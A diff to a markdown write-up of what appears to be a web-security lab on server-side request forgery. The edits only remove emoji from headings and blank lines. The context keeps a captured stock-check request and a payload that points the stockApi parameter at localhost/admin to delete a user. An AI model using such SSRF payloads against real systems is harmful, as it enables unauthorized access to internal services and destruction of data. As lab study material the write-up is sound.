@@ -14,9 +14,9 @@ Access the internal administrative interface located at `http://localhost/admin`
   ```
 * **Vulnerability Mechanism:** The server blindly trusts the URL supplied in `stockApi` and executes the HTTP request from its own internal network context.
 
-## 📡 Traffic Capture Logs
+##  Traffic Capture Logs
 
-### 📥 Baseline Intercepted Request
+###  Baseline Intercepted Request
 This traffic capture demonstrates the original application workflow fetching stock values from an absolute URL:
 
 ```http
@@ -29,7 +29,7 @@ Content-Length: 107
 stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
 ```
 
-### 📤 Weaponized SSRF Exploit Target
+###  Weaponized SSRF Exploit Target
 The modified payload forces the server to loop back internally and access administrative endpoints:
 
 ```http
@@ -41,8 +41,6 @@ Content-Length: 59
 
 stockApi=http://localhost/admin/delete?username=carlos
 ```
-
-
 
 
 ##  Exploitation Step-by-Step
